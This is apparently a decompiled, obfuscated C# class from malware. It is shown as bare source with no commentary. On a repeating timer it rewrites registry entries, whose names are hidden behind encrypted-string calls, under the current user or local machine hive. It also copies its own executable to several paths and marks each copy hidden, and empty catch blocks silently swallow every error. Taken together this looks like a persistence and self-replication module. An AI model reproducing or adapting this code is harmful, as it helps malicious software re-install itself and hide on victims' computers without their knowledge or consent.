using System.ComponentModel;
using System.IO;
using System.Timers;
using Microsoft.Win32;

namespace ns0;

internal class Class8
{
	private static Timer timer_0 = new Timer();

	public static void smethod_0()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		timer_0.set_Interval((double)(Class2.int_1 * 1000));
		timer_0.add_Elapsed((ElapsedEventHandler)delegate
		{
			RegistryKey registryKey = ((!Class2.bool_0) ? Registry.CurrentUser : Registry.LocalMachine);
			try
			{
				if (registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18()) == null)
				{
					registryKey.CreateSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18());
				}
				RegistryKey registryKey2 = registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18(), writable: true);
				if (registryKey2.Equals(Class2.string_5[0]))
				{
					if (registryKey2.GetValue(Class2.string_5[0])!.ToString() != Class2.string_4[0])
					{
						registryKey2.SetValue(Class2.string_5[0], Class2.string_4[0]);
					}
				}
				else
				{
					registryKey2.SetValue(Class2.string_5[0], Class2.string_4[0]);
				}
			}
			catch
			{
			}
			try
			{
				if (registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19()) == null)
				{
					registryKey.CreateSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19());
				}
				RegistryKey registryKey3 = registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19(), writable: true);
				if (registryKey3.Equals(Class2.string_5[1]))
				{
					if (registryKey3.GetValue(Class2.string_5[1])!.ToString() != Class2.string_4[1])
					{
						registryKey3.SetValue(Class2.string_5[1], Class2.string_4[1]);
					}
				}
				else
				{
					registryKey3.SetValue(Class2.string_5[1], Class2.string_4[1]);
				}
			}
			catch
			{
			}
			try
			{
				string[] string_ = Class2.string_4;
				foreach (string text in string_)
				{
					if (!Class7._0024MD_002422(text))
					{
						File.Copy(Class2.string_6, text);
						File.SetAttributes(text, FileAttributes.Hidden);
					}
				}
			}
			catch
			{
			}
		});
		timer_0.Start();
	}

	public static void smethod_1()
	{
		timer_0.Stop();
		((Component)timer_0).Dispose();
	}

	private static void _0024MD_002412(object sender, ElapsedEventArgs e)
	{
		RegistryKey registryKey = ((!Class2.bool_0) ? Registry.CurrentUser : Registry.LocalMachine);
		try
		{
			if (registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18()) == null)
			{
				registryKey.CreateSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18());
			}
			RegistryKey registryKey2 = registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_18(), writable: true);
			if (registryKey2.Equals(Class2.string_5[0]))
			{
				if (registryKey2.GetValue(Class2.string_5[0])!.ToString() != Class2.string_4[0])
				{
					registryKey2.SetValue(Class2.string_5[0], Class2.string_4[0]);
				}
			}
			else
			{
				registryKey2.SetValue(Class2.string_5[0], Class2.string_4[0]);
			}
		}
		catch
		{
		}
		try
		{
			if (registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19()) == null)
			{
				registryKey.CreateSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19());
			}
			RegistryKey registryKey3 = registryKey.OpenSubKey(_003CPrivateImplementationDetails_003E_007BBCE1391D_002DB4A1_002D4042_002DA852_002DF45FBF2D78DE_007D.smethod_19(), writable: true);
			if (registryKey3.Equals(Class2.string_5[1]))
			{
				if (registryKey3.GetValue(Class2.string_5[1])!.ToString() != Class2.string_4[1])
				{
					registryKey3.SetValue(Class2.string_5[1], Class2.string_4[1]);
				}
			}
			else
			{
				registryKey3.SetValue(Class2.string_5[1], Class2.string_4[1]);
			}
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class2.string_4;
			foreach (string text in string_)
			{
				if (!Class7._0024MD_002422(text))
				{
					File.Copy(Class2.string_6, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
			}
		}
		catch
		{
		}
	}
}
